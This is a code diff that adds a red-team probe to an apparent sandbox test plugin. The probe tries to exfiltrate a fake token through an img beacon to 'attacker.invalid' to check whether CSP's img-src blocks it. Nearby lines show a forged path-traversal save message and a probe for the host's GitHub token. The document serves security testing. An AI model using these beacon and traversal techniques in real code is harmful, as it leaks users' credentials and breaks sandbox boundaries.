@@ -14,6 +14,7 @@ export default function init( ctx ) {
 		parentDom: 'pending',
 		githubApi: 'pending',
 		forgedSave: 'pending',
+		imgBeacon: 'pending',
 	};
 
 	// 1. Read the host's GitHub token — the only conceivable path is via
@@ -54,5 +55,21 @@ export default function init( ctx ) {
 
 	} );
 	window.parent.postMessage( { type: 'strata:save', path: '../../outside-repo/pwned.json', bytes: 42 }, '*' );
+
+	// 6. Exfiltrate via an <img> beacon — a classic bypass for an exfil fix
+	// that only locks down connect-src (fetch/XHR) and forgets img-src is
+	// ALSO a network-capable channel. The target domain's actual reachability
+	// is irrelevant to this check: CSP blocks the request before DNS/connect
+	// ever happens, so the deciding signal is the browser's own
+	// `securitypolicyviolation` event, not whether anything would have
+	// answered on the other end.
+	document.addEventListener( 'securitypolicyviolation', ( e ) => {
+
+		if ( e.violatedDirective && e.violatedDirective.startsWith( 'img-src' ) ) state.redteam.imgBeacon = 'blocked';
+
+	} );
+	const beacon = new Image();
+	beacon.onload = () => { state.redteam.imgBeacon = 'leaked'; };
+	beacon.src = 'https://attacker.invalid/beacon.gif?exfil=' + encodeURIComponent( 'token=pretend-leaked-value' );
 
 }
